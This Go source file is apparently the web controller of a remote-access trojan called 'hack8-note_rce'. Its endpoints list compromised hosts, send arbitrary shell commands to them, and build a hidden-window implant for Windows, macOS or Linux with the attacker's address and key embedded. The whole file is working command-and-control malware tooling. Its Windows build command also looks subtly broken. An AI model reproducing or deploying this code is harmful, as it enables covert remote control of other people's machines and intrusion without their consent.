package cotroller

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"hack8-note_rce/Util"
	"os"
	"os/exec"
)

// /api/getNote
func GetNotes(c *gin.Context) {
	adminaddr := c.Query("adminaddr")
	aeskey := c.Query("aeskey")
	hostlist := Util.HostList(adminaddr, aeskey)

	c.JSONP(200, Util.Jsonp(hostlist))
}

// /api/RefreshHost
func RefreshHost(c *gin.Context) {
	adminaddr := c.Query("adminaddr")
	aeskey := c.Query("aeskey")
	hostlist := Util.HostList(adminaddr, aeskey)
	Util.RefreshHost(hostlist, adminaddr, aeskey)
	c.JSONP(200, Util.Jsonp(hostlist))
}

// /api/shell
func Shell(c *gin.Context) {
	noteaddr := c.PostForm("noteaddr")
	aeskey := c.PostForm("aeskey")
	command := c.PostForm("command")
	cmd := Util.Hostexec(noteaddr, aeskey, command)
	fmt.Println(cmd)
	//解决windows乱码
	if Util.IsGBK([]byte(cmd)) {
		fmt.Println("GBK编码")
		decoder := simplifiedchinese.GBK.NewDecoder()
		cmd, _ = decoder.String(cmd)
	}
	c.JSONP(200, Util.Jsonp(cmd))
}

// /api/download
func Download(c *gin.Context) {
	adminaddr := c.Query("adminaddr")
	aeskey := c.Query("aeskey")
	serverOs := c.Query("os")

	//写配置文件

	Util.WriteFile("./config/config.go", "package config\n\nvar (\n\tAdminaddr = \""+adminaddr+"\"\n\tAeskey    = \""+aeskey+"\"\n)\n")

	//生成木马
	var cmd *exec.Cmd
	var filename string
	//判断os
	if serverOs == "windows" {
		os.Setenv("CGO_ENABLED", "0")
		os.Setenv("GOARCH", "amd64")
		os.Setenv("GOOS", "windows")

		filename = "noterce.exe"
		cmd = exec.Command("go", "build", "-o", "-ldflags", "\"-H=windowsgui\"", filename, "win-server.go")

	} else if serverOs == "darwin" {
		os.Setenv("CGO_ENABLED", "0")
		os.Setenv("GOARCH", "amd64")
		os.Setenv("GOOS", "darwin")
		filename = "noterce.darwin"
		cmd = exec.Command("go", "build", "-o", filename, "server.go")

	} else {
		os.Setenv("CGO_ENABLED", "0")
		os.Setenv("GOARCH", "amd64")
		os.Setenv("GOOS", "linux")
		filename = "noterce.linux"
		cmd = exec.Command("go", "build", "-o", filename, "server.go")
	}

	cmd.CombinedOutput()
	c.Header("Content-Type", "application/octet-stream")                     // 设置文件类型
	c.Header("Content-Disposition", "attachment; filename=\""+filename+"\"") // 设置文件名
	c.File(filename)

}
